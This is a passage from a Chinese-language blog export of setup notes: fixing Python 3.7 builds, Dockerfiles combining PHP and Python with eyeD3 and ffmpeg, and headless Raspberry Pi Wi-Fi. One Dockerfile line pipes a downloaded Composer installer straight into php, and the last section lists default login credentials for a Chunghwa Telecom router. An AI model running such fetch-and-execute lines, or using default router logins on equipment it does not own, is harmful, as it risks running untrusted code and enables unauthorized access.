multiprocessing - Stack Overflow](https://stackoverflow.com/questions/27022373/python3-importerror-no-module-named-ctypes-when-using-value-from-module-mul)</span><br><span class=\"line\"></span><br><span class=\"line\">Installing libffi-dev and re-installing python3.7 fixed the problem for me.</span><br><span class=\"line\"></span><br><span class=\"line\">to cleanly build py 3.7 libffi-dev is required or else later stuff will fail</span><br><span class=\"line\"></span><br><span class=\"line\">這邊感覺編譯失敗要重新清除編譯`sudo make clean`</span><br><span class=\"line\">由於這一塊我不熟，或者刪掉 python 資料夾重新跑</span><br><span class=\"line\"></span><br><span class=\"line\">sudo apt-get install libffi-dev</span><br></pre></td></tr></table></figure>\n<h2 id=\"安裝-更新-pip\"><a href=\"#安裝-更新-pip\" class=\"headerlink\" title=\"安裝/更新 pip\"></a>安裝/更新 pip</h2><p> sudo pip3.7 install –upgrade pip</p>\n<p><a href=\"https://qingshan.tk/2019/04/25/how-to-install-python3-on-old-os/\" target=\"_blank\" rel=\"noopener\">安装Python3.7过程中报错的解决方法 - 青衫博客 | QingShan Talk</a></p>\n<p><a href=\"https://help.dreamhost.com/hc/en-us/articles/115000702772-Installing-a-custom-version-of-Python-3\" target=\"_blank\" rel=\"noopener\">https://help.dreamhost.com/hc/en-us/articles/115000702772-Installing-a-custom-version-of-Python-3</a><br><a href=\"https://help.dreamhost.com/hc/en-us/articles/360001435926-Installing-OpenSSL-locally-under-your-username\" target=\"_blank\" rel=\"noopener\">https://help.dreamhost.com/hc/en-us/articles/360001435926-Installing-OpenSSL-locally-under-your-username</a></p>\n<h2 id=\"小記我要安裝的環境\"><a href=\"#小記我要安裝的環境\" class=\"headerlink\" title=\"小記我要安裝的環境\"></a>小記我要安裝的環境</h2><h3 id=\"安裝-eyeD3\"><a href=\"#安裝-eyeD3\" class=\"headerlink\" title=\"安裝 eyeD3\"></a>安裝 eyeD3</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/nicfit/eyeD3.git</span><br><span class=\"line\">cd eyeD3</span><br><span class=\"line\">python setup.py install</span><br><span class=\"line\">sudo pip install pylast</span><br></pre></td></tr></table></figure>\n<p>or</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pip install eyeD3</span><br><span class=\"line\"></span><br><span class=\"line\">sudo pip install pylast</span><br></pre></td></tr></table></figure>\n<p>eyeD3</p>\n<h3 id=\"安裝-ffmpeg\"><a href=\"#安裝-ffmpeg\" class=\"headerlink\" title=\"安裝 ffmpeg\"></a>安裝 ffmpeg</h3><p>Ubuntu 14版可以執行安裝!!</p>\n<blockquote>\n<p>在 Ubuntu 13 以後, FFmpeg 以經被 libav 取代.<br>在官方提供的軟體庫沒有辨法再簡單的 sudo apt-get install ffmpeg 了.<br>新的 libav-tools 套件也用 avconv 執行程式來取代原有的 ffmpeg.<br><a href=\"https://welkinchen.pixnet.net/blog/post/64803028-%E5%9C%A8-ubuntu-14.04-lts-%E5%AE%89%E8%A3%9D-ffmpeg\" target=\"_blank\" rel=\"noopener\">在 Ubuntu 14.04 LTS 安裝 FFmpeg @ Welkin小窩 :: 痞客邦 ::</a></p>\n</blockquote>\n<p>sudo add-apt-repository ppa:jonathonf/ffmpeg-4<br>sudo apt-get update<br>sudo apt-get install ffmpeg</p>\n<p><a href=\"https://tecadmin.net/install-ffmpeg-on-linux/\" target=\"_blank\" rel=\"noopener\">How To Install FFmpeg on Ubuntu 18.04 &amp; 16.04 LTS - TecAdmin</a><br><a href=\"http://rocksaying.tw/archives/22568176.html\" target=\"_blank\" rel=\"noopener\">ffmpeg/avconv 轉檔與影片連接範例 - 石頭閒語</a></p>\n<h2 id=\"docker-啟動-Python\"><a href=\"#docker-啟動-Python\" class=\"headerlink\" title=\"docker 啟動 Python\"></a>docker 啟動 Python</h2><p> docker  run -it python:3.7 bash</p>\n<p>就這麼簡單</p>\n<p>Alpine 沒有安裝 bash<br>所以不能做上面指令</p>\n<p>上面環境組裝 php + python 環境<br>我又遇到 pip3 的問題<br>但 php 源頭是用最新的 Linux<br>所以我暫時用 apt 安裝<br>退而求其次就降板</p>\n<p><strong>這邊跳過不要看，有更好的寫法，不用降板</strong><br>留個紀錄<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">FROM php:7.3</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># ensure local python is preferred over distribution python</span><br><span class=\"line\">ENV PATH /usr/local/bin:$PATH</span><br><span class=\"line\"></span><br><span class=\"line\"># http://bugs.python.org/issue19846</span><br><span class=\"line\"># &gt; At the moment, setting &quot;LANG=C&quot; on a Linux system *fundamentally breaks Python 3*, and that&apos;s not OK.</span><br><span class=\"line\">ENV LANG C.UTF-8</span><br><span class=\"line\"></span><br><span class=\"line\"># extra dependencies (over what buildpack-deps already includes)</span><br><span class=\"line\">RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \\</span><br><span class=\"line\">        tk-dev \\</span><br><span class=\"line\">        uuid-dev \\</span><br><span class=\"line\">        wget \\</span><br><span class=\"line\">        gnupg \\</span><br><span class=\"line\">    &amp;&amp; rm -rf /var/lib/apt/lists/*</span><br><span class=\"line\"></span><br><span class=\"line\">ENV GPG_KEY 0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D</span><br><span class=\"line\">ENV PYTHON_VERSION 3.7.5</span><br><span class=\"line\"></span><br><span class=\"line\">RUN set -ex \\</span><br><span class=\"line\">    \\</span><br><span class=\"line\">    &amp;&amp; wget -O python.tar.xz &quot;https://www.python.org/ftp/python/$&#123;PYTHON_VERSION%%[a-z]*&#125;/Python-$PYTHON_VERSION.tar.xz&quot; \\</span><br><span class=\"line\">    &amp;&amp; wget -O python.tar.xz.asc &quot;https://www.python.org/ftp/python/$&#123;PYTHON_VERSION%%[a-z]*&#125;/Python-$PYTHON_VERSION.tar.xz.asc&quot; \\</span><br><span class=\"line\">    &amp;&amp; export GNUPGHOME=&quot;$(mktemp -d)&quot; \\</span><br><span class=\"line\">    &amp;&amp; gpg --batch --keyserver ha.pool.sks-keyservers.net --recv-keys &quot;$GPG_KEY&quot; \\</span><br><span class=\"line\">    &amp;&amp; gpg --batch --verify python.tar.xz.asc python.tar.xz \\</span><br><span class=\"line\">    &amp;&amp; &#123; command -v gpgconf &gt; /dev/null &amp;&amp; gpgconf --kill all || :; &#125; \\</span><br><span class=\"line\">    &amp;&amp; rm -rf &quot;$GNUPGHOME&quot; python.tar.xz.asc \\</span><br><span class=\"line\">    &amp;&amp; mkdir -p /usr/src/python \\</span><br><span class=\"line\">    &amp;&amp; tar -xJC /usr/src/python --strip-components=1 -f python.tar.xz \\</span><br><span class=\"line\">    &amp;&amp; rm python.tar.xz \\</span><br><span class=\"line\">    \\</span><br><span class=\"line\">    &amp;&amp; cd /usr/src/python \\</span><br><span class=\"line\">    &amp;&amp; gnuArch=&quot;$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)&quot; \\</span><br><span class=\"line\">    &amp;&amp; ./configure \\</span><br><span class=\"line\">        --build=&quot;$gnuArch&quot; \\</span><br><span class=\"line\">        --enable-loadable-sqlite-extensions \\</span><br><span class=\"line\">        --enable-optimizations \\</span><br><span class=\"line\">        --enable-shared \\</span><br><span class=\"line\">        --with-system-expat \\</span><br><span class=\"line\">        --with-system-ffi \\</span><br><span class=\"line\">        --without-ensurepip \\</span><br><span class=\"line\">    &amp;&amp; make -j &quot;$(nproc)&quot; \\</span><br><span class=\"line\"># setting PROFILE_TASK makes &quot;--enable-optimizations&quot; reasonable: https://bugs.python.org/issue36044 / https://github.com/docker-library/python/issues/160#issuecomment-509426916</span><br><span class=\"line\">        PROFILE_TASK=&apos;-m test.regrtest --pgo \\</span><br><span class=\"line\">            test_array \\</span><br><span class=\"line\">            test_base64 \\</span><br><span class=\"line\">            test_binascii \\</span><br><span class=\"line\">            test_binhex \\</span><br><span class=\"line\">            test_binop \\</span><br><span class=\"line\">            test_bytes \\</span><br><span class=\"line\">            test_c_locale_coercion \\</span><br><span class=\"line\">            test_class \\</span><br><span class=\"line\">            test_cmath \\</span><br><span class=\"line\">            test_codecs \\</span><br><span class=\"line\">            test_compile \\</span><br><span class=\"line\">            test_complex \\</span><br><span class=\"line\">            test_csv \\</span><br><span class=\"line\">            test_decimal \\</span><br><span class=\"line\">            test_dict \\</span><br><span class=\"line\">            test_float \\</span><br><span class=\"line\">            test_fstring \\</span><br><span class=\"line\">            test_hashlib \\</span><br><span class=\"line\">            test_io \\</span><br><span class=\"line\">            test_iter \\</span><br><span class=\"line\">            test_json \\</span><br><span class=\"line\">            test_long \\</span><br><span class=\"line\">            test_math \\</span><br><span class=\"line\">            test_memoryview \\</span><br><span class=\"line\">            test_pickle \\</span><br><span class=\"line\">            test_re \\</span><br><span class=\"line\">            test_set \\</span><br><span class=\"line\">            test_slice \\</span><br><span class=\"line\">            test_struct \\</span><br><span class=\"line\">            test_threading \\</span><br><span class=\"line\">            test_time \\</span><br><span class=\"line\">            test_traceback \\</span><br><span class=\"line\">            test_unicode \\</span><br><span class=\"line\">        &apos; \\</span><br><span class=\"line\">    &amp;&amp; make install \\</span><br><span class=\"line\">    &amp;&amp; ldconfig \\</span><br><span class=\"line\">    \\</span><br><span class=\"line\">    &amp;&amp; find /usr/local -depth \\</span><br><span class=\"line\">        \\( \\</span><br><span class=\"line\">            \\( -type d -a \\( -name test -o -name tests \\) \\) \\</span><br><span class=\"line\">            -o \\</span><br><span class=\"line\">            \\( -type f -a \\( -name &apos;*.pyc&apos; -o -name &apos;*.pyo&apos; \\) \\) \\</span><br><span class=\"line\">        \\) -exec rm -rf &apos;&#123;&#125;&apos; + \\</span><br><span class=\"line\">    &amp;&amp; rm -rf /usr/src/python \\</span><br><span class=\"line\">    \\</span><br><span class=\"line\">    &amp;&amp; python3 --version</span><br><span class=\"line\"></span><br><span class=\"line\"># make some useful symlinks that are expected to exist</span><br><span class=\"line\">RUN cd /usr/local/bin \\</span><br><span class=\"line\">    &amp;&amp; ln -s idle3 idle \\</span><br><span class=\"line\">    &amp;&amp; ln -s pydoc3 pydoc \\</span><br><span class=\"line\">    &amp;&amp; ln -s python3 python \\</span><br><span class=\"line\">    &amp;&amp; ln -s python3-config python-config</span><br><span class=\"line\"></span><br><span class=\"line\">RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \\</span><br><span class=\"line\">        python3-pip \\</span><br><span class=\"line\">        git \\</span><br><span class=\"line\">        python3-setuptools</span><br><span class=\"line\"></span><br><span class=\"line\">RUN pip3 install eyeD3</span><br><span class=\"line\"></span><br><span class=\"line\">RUN pip3 install pylast==2.2.0</span><br><span class=\"line\"></span><br><span class=\"line\">RUN apt-get install -y --no-install-recommends \\</span><br><span class=\"line\">    ffmpeg</span><br><span class=\"line\"></span><br><span class=\"line\">CMD [&quot;bash&quot;]</span><br></pre></td></tr></table></figure></p>\n<p>其實我有思考，是不是更正確是要把源頭 from image全改掉<br>全部在包，不過我還沒這樣測試</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">FROM php:7.3</span><br><span class=\"line\"></span><br><span class=\"line\">RUN apt-get update -y &amp;&amp; apt-get install -y openssl zip unzip git libmcrypt-dev</span><br><span class=\"line\">RUN curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer</span><br><span class=\"line\">RUN docker-php-ext-install opcache bcmath pdo_mysql mysqli</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># ensure local python is preferred over distribution python</span><br><span class=\"line\">ENV PATH /usr/local/bin:$PATH</span><br><span class=\"line\"></span><br><span class=\"line\"># http://bugs.python.org/issue19846</span><br><span class=\"line\"># &gt; At the moment, setting &quot;LANG=C&quot; on a Linux system *fundamentally breaks Python 3*, and that&apos;s not OK.</span><br><span class=\"line\">ENV LANG C.UTF-8</span><br><span class=\"line\"></span><br><span class=\"line\"># runtime dependencies</span><br><span class=\"line\">RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \\</span><br><span class=\"line\">\t\tca-certificates \\</span><br><span class=\"line\">\t\tnetbase \\</span><br><span class=\"line\">\t&amp;&amp; rm -rf /var/lib/apt/lists/*</span><br><span class=\"line\"></span><br><span class=\"line\">ENV GPG_KEY 0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D</span><br><span class=\"line\">ENV PYTHON_VERSION 3.7.5</span><br><span class=\"line\"></span><br><span class=\"line\">RUN set -ex \\</span><br><span class=\"line\">\t\\</span><br><span class=\"line\">\t&amp;&amp; savedAptMark=&quot;$(apt-mark showmanual)&quot; \\</span><br><span class=\"line\">\t&amp;&amp; apt-get update &amp;&amp; apt-get install -y --no-install-recommends \\</span><br><span class=\"line\">\t\tdpkg-dev \\</span><br><span class=\"line\">\t\tgcc \\</span><br><span class=\"line\">\t\tlibbz2-dev \\</span><br><span class=\"line\">\t\tlibc6-dev \\</span><br><span class=\"line\">\t\tlibexpat1-dev \\</span><br><span class=\"line\">\t\tlibffi-dev \\</span><br><span class=\"line\">\t\tlibgdbm-dev \\</span><br><span class=\"line\">\t\tliblzma-dev \\</span><br><span class=\"line\">\t\tlibncursesw5-dev \\</span><br><span class=\"line\">\t\tlibreadline-dev \\</span><br><span class=\"line\">\t\tlibsqlite3-dev \\</span><br><span class=\"line\">\t\tlibssl-dev \\</span><br><span class=\"line\">\t\tmake \\</span><br><span class=\"line\">\t\ttk-dev \\</span><br><span class=\"line\">\t\tuuid-dev \\</span><br><span class=\"line\">\t\twget \\</span><br><span class=\"line\">\t\txz-utils \\</span><br><span class=\"line\">\t\tzlib1g-dev \\</span><br><span class=\"line\"># as of Stretch, &quot;gpg&quot; is no longer included by default</span><br><span class=\"line\">\t\t$(command -v gpg &gt; /dev/null || echo &apos;gnupg dirmngr&apos;) \\</span><br><span class=\"line\">\t\\</span><br><span class=\"line\">\t&amp;&amp; wget -O python.tar.xz &quot;https://www.python.org/ftp/python/$&#123;PYTHON_VERSION%%[a-z]*&#125;/Python-$PYTHON_VERSION.tar.xz&quot; \\</span><br><span class=\"line\">\t&amp;&amp; wget -O python.tar.xz.asc &quot;https://www.python.org/ftp/python/$&#123;PYTHON_VERSION%%[a-z]*&#125;/Python-$PYTHON_VERSION.tar.xz.asc&quot; \\</span><br><span class=\"line\">\t&amp;&amp; export GNUPGHOME=&quot;$(mktemp -d)&quot; \\</span><br><span class=\"line\">\t&amp;&amp; gpg --batch --keyserver ha.pool.sks-keyservers.net --recv-keys &quot;$GPG_KEY&quot; \\</span><br><span class=\"line\">\t&amp;&amp; gpg --batch --verify python.tar.xz.asc python.tar.xz \\</span><br><span class=\"line\">\t&amp;&amp; &#123; command -v gpgconf &gt; /dev/null &amp;&amp; gpgconf --kill all || :; &#125; \\</span><br><span class=\"line\">\t&amp;&amp; rm -rf &quot;$GNUPGHOME&quot; python.tar.xz.asc \\</span><br><span class=\"line\">\t&amp;&amp; mkdir -p /usr/src/python \\</span><br><span class=\"line\">\t&amp;&amp; tar -xJC /usr/src/python --strip-components=1 -f python.tar.xz \\</span><br><span class=\"line\">\t&amp;&amp; rm python.tar.xz \\</span><br><span class=\"line\">\t\\</span><br><span class=\"line\">\t&amp;&amp; cd /usr/src/python \\</span><br><span class=\"line\">\t&amp;&amp; gnuArch=&quot;$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)&quot; \\</span><br><span class=\"line\">\t&amp;&amp; ./configure \\</span><br><span class=\"line\">\t\t--build=&quot;$gnuArch&quot; \\</span><br><span class=\"line\">\t\t--enable-loadable-sqlite-extensions \\</span><br><span class=\"line\">\t\t--enable-optimizations \\</span><br><span class=\"line\">\t\t--enable-shared \\</span><br><span class=\"line\">\t\t--with-system-expat \\</span><br><span class=\"line\">\t\t--with-system-ffi \\</span><br><span class=\"line\">\t\t--without-ensurepip \\</span><br><span class=\"line\">\t&amp;&amp; make -j &quot;$(nproc)&quot; \\</span><br><span class=\"line\"># setting PROFILE_TASK makes &quot;--enable-optimizations&quot; reasonable: https://bugs.python.org/issue36044 / https://github.com/docker-library/python/issues/160#issuecomment-509426916</span><br><span class=\"line\">\t\tPROFILE_TASK=&apos;-m test.regrtest --pgo \\</span><br><span class=\"line\">\t\t\ttest_array \\</span><br><span class=\"line\">\t\t\ttest_base64 \\</span><br><span class=\"line\">\t\t\ttest_binascii \\</span><br><span class=\"line\">\t\t\ttest_binhex \\</span><br><span class=\"line\">\t\t\ttest_binop \\</span><br><span class=\"line\">\t\t\ttest_bytes \\</span><br><span class=\"line\">\t\t\ttest_c_locale_coercion \\</span><br><span class=\"line\">\t\t\ttest_class \\</span><br><span class=\"line\">\t\t\ttest_cmath \\</span><br><span class=\"line\">\t\t\ttest_codecs \\</span><br><span class=\"line\">\t\t\ttest_compile \\</span><br><span class=\"line\">\t\t\ttest_complex \\</span><br><span class=\"line\">\t\t\ttest_csv \\</span><br><span class=\"line\">\t\t\ttest_decimal \\</span><br><span class=\"line\">\t\t\ttest_dict \\</span><br><span class=\"line\">\t\t\ttest_float \\</span><br><span class=\"line\">\t\t\ttest_fstring \\</span><br><span class=\"line\">\t\t\ttest_hashlib \\</span><br><span class=\"line\">\t\t\ttest_io \\</span><br><span class=\"line\">\t\t\ttest_iter \\</span><br><span class=\"line\">\t\t\ttest_json \\</span><br><span class=\"line\">\t\t\ttest_long \\</span><br><span class=\"line\">\t\t\ttest_math \\</span><br><span class=\"line\">\t\t\ttest_memoryview \\</span><br><span class=\"line\">\t\t\ttest_pickle \\</span><br><span class=\"line\">\t\t\ttest_re \\</span><br><span class=\"line\">\t\t\ttest_set \\</span><br><span class=\"line\">\t\t\ttest_slice \\</span><br><span class=\"line\">\t\t\ttest_struct \\</span><br><span class=\"line\">\t\t\ttest_threading \\</span><br><span class=\"line\">\t\t\ttest_time \\</span><br><span class=\"line\">\t\t\ttest_traceback \\</span><br><span class=\"line\">\t\t\ttest_unicode \\</span><br><span class=\"line\">\t\t&apos; \\</span><br><span class=\"line\">\t&amp;&amp; make install \\</span><br><span class=\"line\">\t&amp;&amp; ldconfig \\</span><br><span class=\"line\">\t\\</span><br><span class=\"line\">\t&amp;&amp; apt-mark auto &apos;.*&apos; &gt; /dev/null \\</span><br><span class=\"line\">\t&amp;&amp; apt-mark manual $savedAptMark \\</span><br><span class=\"line\">\t&amp;&amp; find /usr/local -type f -executable -not \\( -name &apos;*tkinter*&apos; \\) -exec ldd &apos;&#123;&#125;&apos; &apos;;&apos; \\</span><br><span class=\"line\">\t\t| awk &apos;/=&gt;/ &#123; print $(NF-1) &#125;&apos; \\</span><br><span class=\"line\">\t\t| sort -u \\</span><br><span class=\"line\">\t\t| xargs -r dpkg-query --search \\</span><br><span class=\"line\">\t\t| cut -d: -f1 \\</span><br><span class=\"line\">\t\t| sort -u \\</span><br><span class=\"line\">\t\t| xargs -r apt-mark manual \\</span><br><span class=\"line\">\t&amp;&amp; apt-get purge -y --auto-remove -o APT::AutoRemove::RecommendsImportant=false \\</span><br><span class=\"line\">\t&amp;&amp; rm -rf /var/lib/apt/lists/* \\</span><br><span class=\"line\">\t\\</span><br><span class=\"line\">\t&amp;&amp; find /usr/local -depth \\</span><br><span class=\"line\">\t\t\\( \\</span><br><span class=\"line\">\t\t\t\\( -type d -a \\( -name test -o -name tests \\) \\) \\</span><br><span class=\"line\">\t\t\t-o \\</span><br><span class=\"line\">\t\t\t\\( -type f -a \\( -name &apos;*.pyc&apos; -o -name &apos;*.pyo&apos; \\) \\) \\</span><br><span class=\"line\">\t\t\\) -exec rm -rf &apos;&#123;&#125;&apos; + \\</span><br><span class=\"line\">\t&amp;&amp; rm -rf /usr/src/python \\</span><br><span class=\"line\">\t\\</span><br><span class=\"line\">\t&amp;&amp; python3 --version</span><br><span class=\"line\"></span><br><span class=\"line\"># make some useful symlinks that are expected to exist</span><br><span class=\"line\">RUN cd /usr/local/bin \\</span><br><span class=\"line\">\t&amp;&amp; ln -s idle3 idle \\</span><br><span class=\"line\">\t&amp;&amp; ln -s pydoc3 pydoc \\</span><br><span class=\"line\">\t&amp;&amp; ln -s python3 python \\</span><br><span class=\"line\">\t&amp;&amp; ln -s python3-config python-config</span><br><span class=\"line\"></span><br><span class=\"line\"># if this is called &quot;PIP_VERSION&quot;, pip explodes with &quot;ValueError: invalid truth value &apos;&lt;VERSION&gt;&apos;&quot;</span><br><span class=\"line\">ENV PYTHON_PIP_VERSION 19.3.1</span><br><span class=\"line\"># https://github.com/pypa/get-pip</span><br><span class=\"line\">ENV PYTHON_GET_PIP_URL https://github.com/pypa/get-pip/raw/ffe826207a010164265d9cc807978e3604d18ca0/get-pip.py</span><br><span class=\"line\">ENV PYTHON_GET_PIP_SHA256 b86f36cc4345ae87bfd4f10ef6b2dbfa7a872fbff70608a1e43944d283fd0eee</span><br><span class=\"line\"></span><br><span class=\"line\">RUN set -ex; \\</span><br><span class=\"line\">\t\\</span><br><span class=\"line\">\tsavedAptMark=&quot;$(apt-mark showmanual)&quot;; \\</span><br><span class=\"line\">\tapt-get update; \\</span><br><span class=\"line\">\tapt-get install -y --no-install-recommends wget; \\</span><br><span class=\"line\">\t\\</span><br><span class=\"line\">\twget -O get-pip.py &quot;$PYTHON_GET_PIP_URL&quot;; \\</span><br><span class=\"line\">\techo &quot;$PYTHON_GET_PIP_SHA256 *get-pip.py&quot; | sha256sum --check --strict -; \\</span><br><span class=\"line\">\t\\</span><br><span class=\"line\">\tapt-mark auto &apos;.*&apos; &gt; /dev/null; \\</span><br><span class=\"line\">\t[ -z &quot;$savedAptMark&quot; ] || apt-mark manual $savedAptMark; \\</span><br><span class=\"line\">\tapt-get purge -y --auto-remove -o APT::AutoRemove::RecommendsImportant=false; \\</span><br><span class=\"line\">\trm -rf /var/lib/apt/lists/*; \\</span><br><span class=\"line\">\t\\</span><br><span class=\"line\">\tpython get-pip.py \\</span><br><span class=\"line\">\t\t--disable-pip-version-check \\</span><br><span class=\"line\">\t\t--no-cache-dir \\</span><br><span class=\"line\">\t\t&quot;pip==$PYTHON_PIP_VERSION&quot; \\</span><br><span class=\"line\">\t; \\</span><br><span class=\"line\">\tpip --version; \\</span><br><span class=\"line\">\t\\</span><br><span class=\"line\">\tfind /usr/local -depth \\</span><br><span class=\"line\">\t\t\\( \\</span><br><span class=\"line\">\t\t\t\\( -type d -a \\( -name test -o -name tests \\) \\) \\</span><br><span class=\"line\">\t\t\t-o \\</span><br><span class=\"line\">\t\t\t\\( -type f -a \\( -name &apos;*.pyc&apos; -o -name &apos;*.pyo&apos; \\) \\) \\</span><br><span class=\"line\">\t\t\\) -exec rm -rf &apos;&#123;&#125;&apos; +; \\</span><br><span class=\"line\">\trm -f get-pip.py</span><br><span class=\"line\"></span><br><span class=\"line\">RUN pip install eyeD3</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">CMD [&quot;bash&quot;]</span><br></pre></td></tr></table></figure>\n<h3 id=\"docker-修改經驗小記\"><a href=\"#docker-修改經驗小記\" class=\"headerlink\" title=\"docker 修改經驗小記\"></a>docker 修改經驗小記</h3><ol>\n<li>RUN 這個指令 假如是跟上面有關的，記得要用以下方法</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">RUN git clone https://xxxx \\</span><br><span class=\"line\">    &amp;&amp; cd xxx</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>安裝指令，記得要用<code>apt-get update &amp;&amp; apt-get install -y --no-install-recommends \\</code></li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \\</span><br><span class=\"line\">\t\tca-certificates \\</span><br><span class=\"line\">\t\tnetbase \\</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li><p>要合併 images ，建議找源頭一樣 image，這樣編譯 Dockerfile 比較無痛</p>\n</li>\n<li><p>Slim,Stretch,Alpine 那些到底是什麼?</p>\n</li>\n</ol>\n<p>簡單說一下，Alpine 是體積更小的 Linux，所以她沒有 bash ，不能用 <code>docker run -it xxx bash</code> 真的不好用(我指的是 debug)<br>看到還是滿多人推薦用 Debian</p>\n<p><strong>2020-01-09</strong><br>在 docker 內建沒有 bash</p>\n<p>在 dockerfile 裝<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">RUN apk add --update bash &amp;&amp; rm -rf /var/cache/apk/*</span><br></pre></td></tr></table></figure></p>\n<p>可以參考:Raspberry-Pi-使用-Docker-架設-flexget.md</p>\n<p>更多資訊:</p>\n<ul>\n<li><a href=\"https://nickjanetakis.com/blog/benchmarking-debian-vs-alpine-as-a-base-docker-image\" target=\"_blank\" rel=\"noopener\">Benchmarking Debian vs Alpine as a Base Docker Image — Nick Janetakis</a></li>\n<li><a href=\"https://medium.com/@larry850806/%E5%97%AF%E5%97%AF%E5%B0%8D-%E7%94%A8-slim-%E6%88%96%E6%98%AF-alpine-%E7%A2%BA%E5%AF%A6%E5%8F%AF%E4%BB%A5%E7%9C%81%E4%B8%8B%E5%BE%88%E5%A4%9A%E7%A9%BA%E9%96%93-%E4%BD%86%E5%90%8C%E6%99%82%E4%BB%96%E5%80%91%E4%B9%9F%E5%B0%91%E8%A3%9D%E4%BA%86%E5%BE%88%E5%A4%9A%E6%9D%B1%E8%A5%BF-%E5%8F%AF%E8%83%BD%E6%9C%83%E5%B0%8E%E8%87%B4%E4%B8%80%E4%BA%9B%E5%95%8F%E9%A1%8C-93c4cfa7b024\" target=\"_blank\" rel=\"noopener\">嗯嗯對，用 slim 或是 alpine 確實可以省下很多空間，但同時他們也少裝了很多東西，可能會導致一些問題</a></li>\n<li><a href=\"https://www.cnblogs.com/woshimrf/p/node-docker-image.html\" target=\"_blank\" rel=\"noopener\">如何挑选node docker镜像 - Ryan.Miao - 博客园</a></li>\n<li><a href=\"https://pylixm.cc/posts/2019-06-26-base-image-python-docker-images.html\" target=\"_blank\" rel=\"noopener\">「译」如何选择python项目的基础docker镜像 - Wiki - DeanWu’s Wiki Blog</a></li>\n</ul>\n<ol start=\"5\">\n<li>Dockerfile 有多個可以獨立放在資料夾裡面，感覺在整合 docker-compose 會比較方便</li>\n</ol>\n","categories":["Linux"],"tags":["linux","python"]},{"title":"Raspberry PI 3B設定wifi連線方法","url":"/blog/2018/11/19/Raspberry-PI-3B%E8%A8%AD%E5%AE%9Awifi%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/","content":"<p>最近衝了PI 3，因為沒有多的網路線<br>目前簡單做個wifi設定筆記</p>\n<a id=\"more\"></a>\n<h2 id=\"設定ssh\"><a href=\"#設定ssh\" class=\"headerlink\" title=\"設定ssh\"></a>設定ssh</h2><p>不知道哪個版本就開始要放置sd檔案上面放<code>ssh</code>檔案(touch ssh)<br>開機才會自動開啟ssh server</p>\n<p>當然有上次經驗，我猜想wifi設定應該也有設定的地方<br>google一下，果然不出我所料</p>\n<h2 id=\"設定wifi\"><a href=\"#設定wifi\" class=\"headerlink\" title=\"設定wifi\"></a>設定wifi</h2><p>boot磁區新增一個<code>wpa_supplicant.conf</code>檔案，內容如下<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">country=TW</span><br><span class=\"line\">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</span><br><span class=\"line\">update_config=1</span><br><span class=\"line\"></span><br><span class=\"line\">network=&#123;</span><br><span class=\"line\">    ssid=&quot;SSID_NAME&quot;</span><br><span class=\"line\">    psk=&quot;SSID_KEY&quot;</span><br><span class=\"line\">    key_mgmt=WPA-PSK</span><br><span class=\"line\">    scan_ssid=1</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>原理如下<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">請注意！！！</span><br><span class=\"line\">如果是用 Windows 的朋友，千萬不要用「記事本」去編輯，它編出來的純文字檔，在 Linux 讀取會有問題，請改用 Sublime Text、EmiEditor、Notepad++ .... 等支援 Linux 格式的編輯器來編輯。</span><br><span class=\"line\"></span><br><span class=\"line\">該輸入的資料全部輸入完畢之後，別忘了存檔，而且要正確的把記憶卡退出電腦，可別直接拔了就走。</span><br><span class=\"line\"></span><br><span class=\"line\">接著只要把記憶卡插上 Raspberry Pi 上開機就行了，Rasbian 會把 /boot/wpa_supplicant.conf 複製到 /etc/wpa_supplicant/ 目錄裡，然後就會去讀取裡面的設定值，自動連上無線基地台了。</span><br></pre></td></tr></table></figure></p>\n<p>參考:<a href=\"http://blog.itist.tw/2017/03/headless-wifi-setup-without-monitor-keyboard-or-cables-for-raspberry-pi-zero-w-and-3-model-b.html\" target=\"_blank\" rel=\"noopener\">Raspberry Pi 的基礎 - 沒螢幕、沒鍵盤、沒網路，居然也能設定 Wi-FI 連線 | IT 技術家</a><br><a href=\"https://khanwhlee.blogspot.com/2017/05/wifi-ssh.html?fbclid=IwAR1oGeb690-RkyXFatZM__lvmOc4DrnstVDEfMDLeWGnSrPcrX0TMarjNCk\" target=\"_blank\" rel=\"noopener\">邊玩邊學，輕鬆自學 칸: [樹莓派][Raspberry Pi] 樹莓派無頭式安裝教學（一）- wifi + ssh</a></p>\n<h2 id=\"要怎麼知道IP\"><a href=\"#要怎麼知道IP\" class=\"headerlink\" title=\"要怎麼知道IP\"></a>要怎麼知道IP</h2><p>登入中華電信小烏龜看IP，發現中華電信P883竟然改IP密碼<br>可能是為了安全性…<br>P883帳號密碼為cht/p883(+mac後面四碼)<br>怎麼看到mac呢<br>網路上說可以登入user/user進去看mac<br>另外一種是<code>arp 